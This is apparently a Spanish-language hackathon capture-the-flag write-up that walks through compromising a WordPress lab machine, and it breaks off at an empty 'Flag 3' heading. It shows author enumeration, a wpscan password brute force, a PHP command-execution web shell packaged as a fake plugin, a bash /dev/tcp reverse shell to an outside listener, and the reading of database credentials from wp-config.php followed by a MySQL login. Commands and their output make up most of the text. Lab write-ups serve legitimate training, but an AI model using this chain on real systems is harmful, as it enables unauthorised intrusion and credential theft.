# Hackaton UdG - Reto 2

## Index

- [Flag 1](#flag-1)

- [Flag 2](#flag-2)

- [Flag 3](#flag-3)


### Flag 1 

Lo primero que encontramos es en la ruta `htpp://<IP>/wp1/` así que nos encontramos ante una máquina con WordPress.

Encontramos el usuario `admin` con la comanda `curl -s -L http://<IP>/wp1/?author=1` y con esta información y mediante fuerza bruta con la herramienta `wpscan` y ejecutando el siguiente comando 

```shell
wpscan --url http://10.0.2.12/wp1/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin --enumerate u --disable-tls-checks > wpscan-pass.txt
``` 
sacamos las credenciales: `admin:spongebob`

> [!NOTE]
> Problema de resolución de DNS, se tuvo que añadir una línea `echo "10.0.2.12 reto02.hackaton" | sudo tee -a /etc/hosts
`

### Flag 2 

Una vez dentro del WordPress como admin y haciendo uso de la sección de Medios podemos subir una `reverse shell`

```shell
echo "<?php system(\$_GET['cmd']); ?>" > shell.php

```
> [!NOTE]
> shell.php
> Lo siento, no tienes permisos para subir este tipo de archivo.

Como de primeras no nos deja subir archivos con esta extensión, pasamos al plan de subir la _reverse shell_ como un plugin de WordPress, este apartado solo acepta archivos de extensión **.zip** así que habrá que crear un "pseudo-plugin" ocn la _reverse shell_ dentro  

```php
<?php
/*
Plugin Name: Shell Plugin
Plugin URI: http://hackaton
Description: Plugin de prueba para ejecución remota.
Version: 1.0
Author: Hacker
Author URI: http://hackaton
*/

if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>

```
después lo pasamo a **.zip**

```shell
zip -r shell-plugin.zip shell-plugin.php

```
lo subimos como plugin y lo activamos. Para hacer la prueba de que funciona, simplemente podemos usar la comanda siguiente:

```shell
curl -s http://reto02.hackaton/wp1/wp-content/plugins/shell-plugin.php?cmd=id | head -n 10

```

lo que nos mostrará el siguiente resultado:

```html
uid=33(www-data) gid=33(www-data) groups=33(www-data)

<!DOCTYPE html>
<html lang="es">
<head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name='robots' content='noindex, nofollow' />
        <style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
        <title>Página no encontrada &#8211; HACKATÓN &#8211; RETO 02</title>

```

una vez tenemos nuestro _reverse shell_ metida en el WordPress, la lanzamos mediante el siguiente comando

```shell
curl -s "http://reto02.hackaton/wp1/wp-content/plugins/shell-plugin.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.0.2.15/4444%200>%261'"

```
> [!NOTE]
> Se han formateado los 'espacios' a '%20' porque nos loas admite.

en otra terminal estabamos escuchando con el comando 


```shell
nc -lvnp 4444
```

obteniendo el siguiente resultado y afirmándonos que estamos dentro de la máquina


```shell
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.12] 39800
bash: cannot set terminal process group (764): Inappropriate ioctl for device
bash: no job control in this shell
www-data@reto02:/var/www/html/wp1$ whoami
whoami
www-data
www-data@reto02:/var/www/html/wp1$ 

```
comprobamos que hay un usuario al intentar ir al lugar d el primera flag, el usuario es `steve`, pero no tenemos permisos para ver dentro de sus carpetas, pero primero para poder hacer más ineractiva la shell ejecutamos dentro de la shell

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```shell
www-data@reto02:/home$ cat /var/www/html/wp1/wp-config.php | grep DB_
cat /var/www/html/wp1/wp-config.php | grep DB_
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', '9pXYwXSnap`4pqpg~7TcM9bPVXY&~RM9i3nnex%r' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8mb4' );
define( 'DB_COLLATE', '' );

```

```shell
www-data@reto02:/home$ mysql -u wordpress -p'9pXYwXSnap`4pqpg~7TcM9bPVXY&~RM9i3nnex%r'
<dpress -p'9pXYwXSnap`4pqpg~7TcM9bPVXY&~RM9i3nnex%r'
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 23511
Server version: 8.0.39-0ubuntu0.24.04.2 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 

```

### Flag 3


